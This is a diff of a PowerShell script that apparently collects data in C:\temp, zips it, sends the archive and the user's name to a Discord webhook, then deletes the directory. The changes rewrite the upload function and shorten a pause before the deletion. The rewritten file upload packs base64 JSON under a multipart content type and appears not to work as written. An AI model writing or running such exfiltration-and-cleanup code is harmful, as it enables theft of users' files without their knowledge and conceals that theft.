@@ -20,6 +20,8 @@ function TempDir {
     Set-Location -Path "C:\temp"
 }
 
+
+# Modified Upload-Discord function for Invoke-RestMethod
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -29,17 +31,28 @@ function Upload-Discord {
         [string]$text 
     )
 
+    $hookurl = "$DiscordUrl"
+
     $Body = @{
         'username' = $env:username
         'content' = $text
     }
 
     if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
     }
 
     if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $DiscordUrl
+        $fileContent = Get-Content $file -Raw
+        $fileBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
+        $filePayload = @{
+            file = @{
+                value = $fileBase64
+                filename = (Get-Item $file).Name
+                contenttype = 'application/zip'
+            }
+        }
+        Invoke-RestMethod -Uri "$hookurl" -Method Post -Body ($filePayload | ConvertTo-Json) -ContentType 'multipart/form-data'
     }
 }
 
@@ -502,7 +515,7 @@ function DelTempDir {
         Upload-Discord -file $zipFilePath -text "Temporary Directory Archive: $zipFileName"
 
         # Pause for 15 seconds
-        Start-Sleep -Seconds 15
+        Start-Sleep -Seconds 05
 
         # Remove the C:\temp directory
         Remove-Item -Path "C:\temp" -Force -Recurse
